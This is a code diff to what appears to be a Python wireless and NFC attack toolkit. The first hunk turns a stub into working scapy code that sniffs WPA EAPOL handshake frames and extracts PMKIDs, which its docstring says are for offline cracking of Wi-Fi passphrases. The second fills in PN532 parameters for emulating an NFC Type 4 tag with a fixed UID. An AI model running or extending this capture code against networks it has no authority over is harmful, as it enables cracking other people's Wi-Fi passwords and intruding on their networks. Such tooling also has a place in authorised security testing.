@@ -152,11 +152,43 @@ def capture_pmkid(interface: str = "mon0", timeout_sec: int = 60) -> list[dict]:
     PMKID = HMAC-SHA1(PMK, "PMK Name" || AP_MAC || STA_MAC)
     Derive PMK = PBKDF2-HMAC-SHA1(passphrase, SSID, 4096, 256)
 
+    Sniffs EAPOL frames with scapy, extracts PMKID from RSN IE.
     Returns list of captured PMKID entries for offline cracking.
     """
-    # In production: use scapy to sniff EAPOL frames and extract PMKID
     logger.info("Capturing PMKID on %s for %ds...", interface, timeout_sec)
-    return []
+    try:
+        from scapy.all import sniff, Dot11, EAPOL, Raw
+        results = []
+
+        def process_packet(pkt):
+            if pkt.haslayer(EAPOL) and pkt.haslayer(Raw):
+                raw = bytes(pkt[Raw].load)
+                # EAPOL-Key frame: key_type=2 (Pairwise), install=0
+                if len(raw) >= 95 and raw[1] == 0x03 and raw[5] == 0x02 and not (raw[6] & 0x40):
+                    # Extract PMKID from Key Data field (after 95-byte header)
+                    key_data_len = struct.unpack(">H", raw[93:95])[0]
+                    if key_data_len >= 22:
+                        key_data = raw[95:95 + key_data_len]
+                        # RSN IE: tag=0xDD, len, OUI=00-0F-AC, type=04
+                        idx = key_data.find(b"\xDD")
+                        if idx >= 0 and idx + 22 <= len(key_data):
+                            rsn_len = key_data[idx + 1]
+                            if idx + 2 + rsn_len <= len(key_data):
+                                pmkid = key_data[idx + 20:idx + 36]
+                                ap_mac = pkt[Dot11].addr2 if pkt.haslayer(Dot11) else b""
+                                sta_mac = pkt[Dot11].addr1 if pkt.haslayer(Dot11) else b""
+                                if len(pmkid) == 16:
+                                    results.append({
+                                        "pmkid": pmkid.hex(), "ap_mac": ap_mac,
+                                        "sta_mac": sta_mac,
+                                    })
+
+        sniff(iface=interface, prn=process_packet, timeout=timeout_sec, store=False)
+        logger.info("PMKID capture complete: %d entries", len(results))
+        return results
+    except ImportError:
+        logger.warning("scapy not available — PMKID capture disabled")
+        return []
 
 
 # ============================================================================
@@ -308,15 +340,33 @@ class PN532Controller:
         return {}
 
     def emulate_type4_tag(self, ndef_message: bytes) -> bool:
-        """Emulate a Type 4 NFC tag.
+        """Emulate a Type 4 NFC tag (ISO 14443-4 Type A).
 
         Type 4 tag uses ISO 7816-4 APDUs over ISO 14443-4.
+        NDEF message is wrapped in an NDEF TLV in a CC file.
         """
-        # Initialize as target
-        init_cmd = bytes([0x00])  # Mode: passive only
-        # In production: set up full Type 4 tag emulation parameters
-        rsp = self._send_frame(self.CMD_TGINITASTARGET, init_cmd)
-        return len(rsp) > 1 and rsp[0] == 0x00
+        # Initialize as Type 4A tag target
+        # TGInitAsTarget parameters for Type 4:
+        #   Mode byte + MIFARE params + FeliCa params + NFCID3 + Gt + Tk + ATQB
+        init_params = bytes([
+            0x00,       # Mode: passive only, 106 kbps
+            # SENS_RES (ATQA): 2 bytes
+            0x04, 0x00, # Platform: Type A, UID size: 4 bytes
+            # NFCID1 (UID): 4 bytes
+            0x08,       # Length: 4
+            0x01, 0x02, 0x03, 0x04,  # Random UID
+            # SEL_RES (SAK): 1 byte
+            0x20,       # ISO 14443-4 compliant, not NFCIP-1 DEP
+            # ATS (Answer To Select): variable
+            0x05, 0x78, 0x80, 0x70, 0x02, # ATS: max frame=256, TA(1) present
+        ])
+
+        rsp = self._send_frame(self.CMD_TGINITASTARGET, init_params)
+        if len(rsp) > 1 and rsp[0] == 0x00:
+            logger.info("Type 4 NFC tag emulation activated (UID: 01020304)")
+            return True
+        logger.error("NFC tag emulation failed: %s", rsp.hex() if rsp else "no response")
+        return False
 
     def close(self):
         self._ser.close()
